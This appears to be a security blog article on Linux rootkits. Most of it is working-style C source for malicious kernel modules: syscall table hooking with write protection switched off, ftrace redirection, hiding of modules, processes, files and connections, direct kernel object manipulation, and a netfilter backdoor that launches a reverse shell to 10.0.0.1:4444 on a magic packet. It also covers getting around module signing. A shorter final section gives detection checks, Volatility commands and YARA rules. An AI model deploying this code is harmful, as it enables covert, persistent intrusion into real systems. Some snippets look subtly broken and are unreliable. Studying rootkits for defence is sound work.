---
title: "Linux Rootkit Analysis: Kernel Module Backdoors, Syscall Hooking, and Detection Techniques"
description: "In-depth analysis of Linux rootkit internals including LKM-based backdoors, syscall table hooking, /proc filesystem hiding, network traffic concealment, and detection methods using kernel integrity checking."
pubDate: 2023-09-07
author: "Mamone Tarsia"
tags: ["reverse-engineering", "linux", "malware", "kernel"]
draft: false
---

## Introduction

Linux rootkits are sophisticated malware that operate at kernel level, providing attackers with persistent access while evading detection. Understanding rootkit techniques is essential for both offensive security research and defensive incident response.

## Loadable Kernel Modules (LKM)

### Basic LKM Structure

```c
// simple_rootkit.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Researcher");
MODULE_DESCRIPTION("Educational rootkit example");

static int __init rootkit_init(void) {
    printk(KERN_INFO "Rootkit loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

**Compilation**:

```makefile
# Makefile
obj-m += simple_rootkit.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

```bash
# Build
make

# Load module
sudo insmod simple_rootkit.ko

# Verify loaded
lsmod | grep simple_rootkit

# Unload
sudo rmmod simple_rootkit
```

## Syscall Table Hooking

### Finding Syscall Table

```c
// find_syscall_table.c
#include <linux/module.h>
#include <linux/kallsyms.h>

unsigned long *sys_call_table;

static int __init find_sct_init(void) {
    // Method 1: Using kallsyms_lookup_name (pre-5.7 kernel)
    #if LINUX_VERSION_CODE < KERNEL_VERSION(5,7,0)
    sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    #else
    // Method 2: Manual search (post-5.7)
    unsigned long offset;

    // Syscall table is between _stext and _etext
    for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
        unsigned long *sct = (unsigned long *)offset;

        // Verify by checking known syscall addresses
        if (sct[__NR_close] == (unsigned long)ksys_close) {
            sys_call_table = sct;
            break;
        }
    }
    #endif

    if (sys_call_table) {
        printk(KERN_INFO "Syscall table found at: 0x%p\n", sys_call_table);
    } else {
        printk(KERN_ERR "Syscall table not found\n");
        return -1;
    }

    return 0;
}

module_init(find_sct_init);
```

### Hooking sys_open

```c
// hook_open.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");

unsigned long *sys_call_table;
asmlinkage long (*original_sys_open)(const struct pt_regs *);

// Hooked sys_open function
asmlinkage long hooked_sys_open(const struct pt_regs *regs) {
    char __user *filename = (char *)regs->di;
    char kernel_filename[256];

    // Copy filename from userspace
    long copied = strncpy_from_user(kernel_filename, filename, sizeof(kernel_filename));

    if (copied > 0) {
        // Log file accesses
        printk(KERN_INFO "File opened: %s\n", kernel_filename);

        // Hide specific files (return -ENOENT)
        if (strstr(kernel_filename, "secret")) {
            return -ENOENT;  // File not found
        }
    }

    // Call original syscall
    return original_sys_open(regs);
}

// Disable write protection on syscall table
static inline void protect_memory(void) {
    write_cr0(read_cr0() | 0x10000);
}

static inline void unprotect_memory(void) {
    write_cr0(read_cr0() & (~0x10000));
}

static int __init hook_init(void) {
    // Find syscall table
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    if (!sys_call_table) {
        printk(KERN_ERR "Cannot find syscall table\n");
        return -1;
    }

    // Save original sys_open
    original_sys_open = (void *)sys_call_table[__NR_open];

    // Disable write protection
    unprotect_memory();

    // Replace syscall
    sys_call_table[__NR_open] = (unsigned long)hooked_sys_open;

    // Re-enable write protection
    protect_memory();

    printk(KERN_INFO "sys_open hooked\n");
    return 0;
}

static void __exit hook_exit(void) {
    // Restore original syscall
    unprotect_memory();
    sys_call_table[__NR_open] = (unsigned long)original_sys_open;
    protect_memory();

    printk(KERN_INFO "sys_open unhooked\n");
}

module_init(hook_init);
module_exit(hook_exit);
```

### Modern Alternatives: Ftrace

Kernel 5.7+ restricts direct syscall table modification. Use ftrace instead:

```c
// ftrace_hook.c
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

static struct ftrace_ops ftrace_ops;
static unsigned long target_ip;

// Ftrace callback
static void notrace ftrace_callback(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct pt_regs *regs)
{
    // Modify registers to redirect execution
    regs->ip = (unsigned long)hooked_sys_open;
}

static int hook_syscall_ftrace(void) {
    // Get target function address
    target_ip = kallsyms_lookup_name("__x64_sys_open");

    // Setup ftrace
    ftrace_ops.func = ftrace_callback;
    ftrace_ops.flags = FTRACE_OPS_FL_SAVE_REGS |
                       FTRACE_OPS_FL_RECURSION_SAFE |
                       FTRACE_OPS_FL_IPMODIFY;

    // Register ftrace hook
    return ftrace_set_filter_ip(&ftrace_ops, target_ip, 0, 0) ||
           register_ftrace_function(&ftrace_ops);
}
```

## Process Hiding

### Hiding from /proc

```c
// hide_process.c
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>

static struct list_head *prev_module;
static short hidden = 0;

// Hide module from lsmod
void hide_module(void) {
    if (!hidden) {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        hidden = 1;
    }
}

void show_module(void) {
    if (hidden) {
        list_add(&THIS_MODULE->list, prev_module);
        hidden = 0;
    }
}

// Hook /proc/[pid] to hide processes
struct proc_dir_entry *proc_root;
filldir_t original_filldir;

static int hooked_filldir(struct dir_context *ctx, const char *name,
                         int namlen, loff_t offset, u64 ino,
                         unsigned int d_type)
{
    // Hide specific PIDs
    if (strcmp(name, "1337") == 0 || strcmp(name, "31337") == 0) {
        printk(KERN_INFO "Hiding PID: %s\n", name);
        return 0;  // Don't add to directory listing
    }

    // Call original filldir
    return original_filldir(ctx, name, namlen, offset, ino, d_type);
}

// Alternatively: Hide by task_struct manipulation
#include <linux/sched.h>

void hide_task(pid_t pid) {
    struct task_struct *task;

    // Find task
    for_each_process(task) {
        if (task->pid == pid) {
            // Remove from task list
            list_del(&task->tasks);
            break;
        }
    }
}
```

## File Hiding

### Hooking readdir/getdents

```c
// hide_files.c
#include <linux/module.h>
#include <linux/dirent.h>

asmlinkage long (*original_getdents64)(const struct pt_regs *);

asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *current_dir, *previous_dir, *kdirent;
    unsigned long offset = 0;
    long ret;

    // Call original syscall
    ret = original_getdents64(regs);

    if (ret <= 0)
        return ret;

    // Allocate kernel buffer
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    // Copy dirents to kernel space
    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    // Iterate and filter
    while (offset < ret) {
        current_dir = (void *)kdirent + offset;

        // Hide files containing "rootkit"
        if (strstr(current_dir->d_name, "rootkit") != NULL) {
            printk(KERN_INFO "Hiding file: %s\n", current_dir->d_name);

            // Skip this entry by adjusting previous entry's d_reclen
            if (offset == 0) {
                // First entry - shift all remaining entries
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen,
                       ret - offset);
                continue;
            } else {
                // Adjust previous entry to skip current
                previous_dir->d_reclen += current_dir->d_reclen;
            }
        } else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    // Copy filtered results back to userspace
    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    return ret;
}
```

## Network Backdoor

### Packet Filtering with Netfilter

```c
// network_backdoor.c
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define MAGIC_PORT 31337
#define BACKDOOR_CMD 0x42

static struct nf_hook_ops nfho;

// Netfilter hook function
unsigned int hook_func(void *priv, struct sk_buff *skb,
                      const struct nf_hook_state *state)
{
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;

    if (!skb)
        return NF_ACCEPT;

    ip_header = ip_hdr(skb);

    if (ip_header->protocol == IPPROTO_TCP) {
        tcp_header = tcp_hdr(skb);

        // Check for magic port
        if (ntohs(tcp_header->dest) == MAGIC_PORT) {
            unsigned char *payload = (unsigned char *)((unsigned char *)tcp_header +
                                                      (tcp_header->doff * 4));

            // Check for backdoor command
            if (payload[0] == BACKDOOR_CMD) {
                printk(KERN_INFO "Backdoor activated!\n");

                // Execute reverse shell
                char *argv[] = {"/bin/bash", "-c",
                               "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", NULL};
                char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

                call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

                // Drop packet to hide activity
                return NF_DROP;
            }
        }
    }

    return NF_ACCEPT;
}

static int __init backdoor_init(void) {
    nfho.hook = hook_func;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;

    nf_register_net_hook(&init_net, &nfho);

    printk(KERN_INFO "Network backdoor installed\n");
    return 0;
}

static void __exit backdoor_exit(void) {
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "Network backdoor removed\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);
```

### Hiding Network Connections

```c
// hide_connections.c
#include <linux/module.h>
#include <linux/tcp.h>
#include <net/tcp.h>

// Hook tcp4_seq_show to hide connections
asmlinkage long (*original_tcp4_seq_show)(struct seq_file *, void *);

asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct inet_sock *inet;

    if (v != SEQ_START_TOKEN) {
        inet = inet_sk((struct sock *)v);

        // Hide connections to specific IPs/ports
        if (ntohs(inet->inet_dport) == 4444 ||  // Reverse shell port
            ntohs(inet->inet_sport) == 31337) {  // Backdoor port
            return 0;  // Don't show in netstat
        }
    }

    return original_tcp4_seq_show(seq, v);
}
```

## Rootkit Detection

### Integrity Checking

```c
// detect_syscall_hooks.c
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>

void check_syscall_table(void) {
    unsigned long *sys_call_table;
    int i;

    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    printk(KERN_INFO "Checking syscall table integrity...\n");

    for (i = 0; i < 400; i++) {
        unsigned long syscall_addr = sys_call_table[i];
        char symbol_name[128];

        // Get symbol name for this address
        kallsyms_lookup(syscall_addr, NULL, NULL, NULL, symbol_name);

        // Check if syscall points to expected kernel region
        if (syscall_addr < (unsigned long)_stext ||
            syscall_addr > (unsigned long)_etext) {
            printk(KERN_WARNING "Suspicious syscall %d: %s at 0x%lx\n",
                   i, symbol_name, syscall_addr);
        }

        // Check if syscall name matches expected pattern
        if (!strstr(symbol_name, "sys_") &&
            !strstr(symbol_name, "__x64_sys_")) {
            printk(KERN_WARNING "Syscall %d has unexpected name: %s\n",
                   i, symbol_name);
        }
    }
}
```

### Memory Scanning

```bash
#!/bin/bash
# scan_memory.sh - Detect hidden kernel modules

# Method 1: Compare lsmod with /proc/modules
echo "[*] Checking for hidden modules..."

lsmod_output=$(lsmod | tail -n +2 | cut -d' ' -f1 | sort)
proc_output=$(cat /proc/modules | cut -d' ' -f1 | sort)

diff <(echo "$lsmod_output") <(echo "$proc_output")

# Method 2: Check /sys/module
for module in /sys/module/*; do
    basename "$module"
done | sort > /tmp/sys_modules

diff /tmp/sys_modules <(echo "$proc_output")

# Method 3: Scan kernel memory for hidden LKMs
echo "[*] Scanning kernel memory..."

if [ -r /proc/kcore ]; then
    strings /proc/kcore | grep -i "module_init\|module_exit" | head -20
fi

# Method 4: Check for syscall hooks
echo "[*] Checking syscall table..."

if [ -f /boot/System.map-$(uname -r) ]; then
    expected_addr=$(grep " sys_call_table$" /boot/System.map-$(uname -r) | cut -d' ' -f1)
    echo "Expected syscall table: 0x$expected_addr"

    # Compare with runtime (requires custom kernel module)
    # See detect_syscall_hooks.c above
fi
```

### Volatility Analysis

```bash
# Offline memory forensics with Volatility
# Dump kernel memory
dd if=/dev/mem of=memory.dump bs=1M

# Or use LiME (Linux Memory Extractor)
insmod lime.ko "path=/tmp/memory.dump format=lime"

# Analyze with Volatility
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_banner
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_lsmod
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_hidden_modules

# Check syscall table
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_check_syscall

# Find hidden processes
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_pslist
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_pstree

# Network connections
volatility -f memory.dump --profile=LinuxUbuntu2004x64 linux_netstat
```

### YARA Rules

```yara
// detect_rootkit.yar
rule Linux_Rootkit_Syscall_Hook {
    meta:
        description = "Detects syscall hooking patterns"
        author = "Security Researcher"

    strings:
        $sct1 = "sys_call_table" ascii
        $sct2 = "kallsyms_lookup_name" ascii
        $hook1 = "original_sys_" ascii
        $hook2 = "hooked_sys_" ascii
        $cr0_1 = { 0F 20 C0 }  // mov rax, cr0
        $cr0_2 = { 0F 22 C0 }  // mov cr0, rax

    condition:
        uint32(0) == 0x464c457f and  // ELF magic
        (
            (all of ($sct*) and 1 of ($hook*)) or
            (all of ($cr0_*) and 1 of ($sct*))
        )
}

rule Linux_Rootkit_Process_Hiding {
    meta:
        description = "Detects process hiding techniques"

    strings:
        $proc1 = "/proc" ascii
        $proc2 = "filldir" ascii
        $hide1 = "list_del" ascii
        $hide2 = "task_struct" ascii

    condition:
        uint32(0) == 0x464c457f and
        all of them
}
```

## Kernel Module Signing

### Enforcing Signed Modules

```bash
# Check if module signing is enforced
cat /proc/sys/kernel/modules_disabled
# 0 = modules can be loaded
# 1 = module loading disabled

# Check signature requirement
dmesg | grep "module verification"

# Sign a module
/usr/src/linux-headers-$(uname -r)/scripts/sign-file \
    sha256 \
    /path/to/signing_key.priv \
    /path/to/signing_key.x509 \
    rootkit.ko

# Verify signature
modinfo rootkit.ko | grep sig
```

### Bypassing Module Signing (Pre-boot)

```bash
# Disable secure boot in BIOS/UEFI

# OR: Add custom signing key to MOK (Machine Owner Key)
mokutil --import /path/to/custom_key.der

# Reboot and enroll key in UEFI
```

## Advanced Rootkit Techniques

### DKOM (Direct Kernel Object Manipulation)

```c
// Manipulate kernel structures directly without hooks
void hide_task_dkom(pid_t pid) {
    struct task_struct *task;
    struct pid *pid_struct;

    // Get task_struct
    pid_struct = find_get_pid(pid);
    task = pid_task(pid_struct, PIDTYPE_PID);

    if (task) {
        // Remove from process tree
        list_del_init(&task->sibling);
        list_del_init(&task->tasks);

        // Remove from PID hash table
        detach_pid(task, PIDTYPE_PID);
        detach_pid(task, PIDTYPE_PGID);
        detach_pid(task, PIDTYPE_SID);
    }
}
```

### Inline Hooking

```c
// Patch function prologue directly
void inline_hook_function(void *target, void *hook) {
    unsigned char jump[5];

    // Build JMP instruction
    jump[0] = 0xE9;  // JMP opcode
    *(unsigned int *)(jump + 1) = (unsigned long)hook - (unsigned long)target - 5;

    // Make memory writable
    set_memory_rw((unsigned long)target, 1);

    // Patch first 5 bytes
    memcpy(target, jump, 5);

    // Restore protection
    set_memory_ro((unsigned long)target, 1);
}
```

## Conclusion

Linux rootkit analysis requires understanding of:
1. Kernel module development and loading
2. Syscall hooking mechanisms (direct table modification, ftrace)
3. Process/file hiding techniques
4. Network traffic concealment
5. Detection methods (integrity checking, memory forensics, YARA)
6. Protection mechanisms (module signing, UEFI Secure Boot)

Modern Linux kernels include extensive protections against rootkits, but sophisticated attackers continue to develop novel techniques. Defensive security requires continuous monitoring, integrity verification, and behavioral analysis.

## References

1. Linux Kernel Documentation - Loadable Kernel Modules
2. Henderson, B. (2020). "Offensive Linux Rootkit Development"
3. Volatility Foundation - Linux Memory Forensics
4. Case, A., Richard, G. (2017). "Memory Forensics: The Path Forward"
5. Kernel.org - Module Signing
